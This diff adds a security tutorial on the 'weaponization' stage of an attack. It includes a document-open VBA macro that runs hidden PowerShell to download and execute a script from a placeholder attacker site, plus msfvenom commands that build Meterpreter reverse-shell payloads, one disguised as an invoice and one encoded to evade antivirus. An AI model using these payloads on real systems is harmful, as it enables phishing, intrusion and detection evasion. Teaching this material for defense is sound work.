@@ -1,0 +1,68 @@
+After sufficient information (operating system used, open ports, vulnerable applications, employee email addresses, etc.) is gathered about the target in the Reconnaissance stage, the attacker moves to the Weaponization stage. This is the stage where the attacker combines an "exploit" (exploitation code) that can use the detected vulnerability with a "payload" (malicious load) that will provide access to the target system.
+In short: Exploit + Payload = Weapon
+This stage usually takes place in the attacker's own local environment, meaning there is no contact with the target system yet.
+
+Basic Concepts
+Exploit
+Code that triggers a vulnerability (software bug, configuration flaw, etc.) in the target system, causing the system to behave unexpectedly.
+Payload
+
+The actual malicious code that will be executed on the target system after the exploit successfully runs. Its purpose is usually to provide persistent access to the system, steal data, or control the system.
+Reverse Shell: Allows the target machine to connect back to the attacker's machine. (Preferred because Firewalls usually restrict outgoing traffic less.)
+Bind Shell: Opens a port on the target machine and waits for the attacker to connect to this port.
+Weaponization Types and File Formats
+Attackers hide their payloads in file formats that will bypass the target's security measures and deceive the user.
+
+1. Office Documents (Macros)
+VBA (Visual Basic for Applications) macros embedded in Microsoft Office files (Word, Excel) are one of the most frequently used weaponization methods in cyber attacks. When the user opens the file and clicks "Enable Content," the malicious code runs.
+Example VBA Macro (Conceptual):
+
+VBA Macro Example
+Sub AutoOpen()
+    Dim shell As Object
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-site.com/payload.ps1')"
+End Sub
+This code runs PowerShell in the background when the document opens, downloading and executing a script from the attacker's server.
+
+2. PDF Files
+Files that exploit vulnerabilities in PDF readers or contain embedded JavaScript.
+
+3. HTA (HTML Application) and Script Files
+Extensions like .hta, .js, .vbs on Windows systems are directly executable files and usually have the authority to execute system commands.
+Payload Creation Tools
+Attackers use various automated tools during the weaponization stage. The most popular of these is the Metasploit Framework and its payload generation tool Msfvenom.
+Creating Payload with Msfvenom
+The following example creates a malicious .exe file for a Windows target that will establish a reverse connection back to the attacker.
+
+Msfvenom Usage
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o invoice_update.exe
+-p windows/x64/meterpreter/reverse_tcp: Payload type (Windows 64-bit, Meterpreter reverse shell).
+LHOST=192.168.1.5: Attacker's IP address (Listening Host).
+LPORT=4444: Port the attacker will listen on (Listening Port).
+-f exe: Output format (Executable).
+-o invoice_update.exe: Name of the created file (Named "invoice update" to deceive the victim).
+Web Payload Example (PHP)
+
+If the target is a web server, a PHP-based payload can be prepared:
+
+Msfvenom PHP Payload
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > shell.php
+Obfuscation
+Security devices (Antivirus, EDR) can easily detect known payload signatures. Therefore, attackers use Obfuscation techniques to hide their code.
+
+Encoding: Converting code to formats like Base64, Hex.
+Packing: Compressing and encrypting the executable file (e.g., UPX).
+Encryption: Ensuring the malicious code is decrypted and executed in memory.
+For example, using the shikata_ga_nai encoder, the payload's signature can be changed:
+
+Msfvenom Encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
+-i 5: Indicates that the encoding process will be repeated 5 times.
+
+Defense in Weaponization Stage
+Since this stage takes place on the attacker's own systems, it is impossible to detect directly. However, analysis of the produced "weapons" is critical for defense:
+
+Threat Intelligence: Following new exploit kits and malware techniques.
+File Analysis: Analyzing suspicious files in a Sandbox environment.
+Email Security: Blocking office files containing macros or suspicious extensions (.exe, .scr, .vbs) at the Email Gateway.
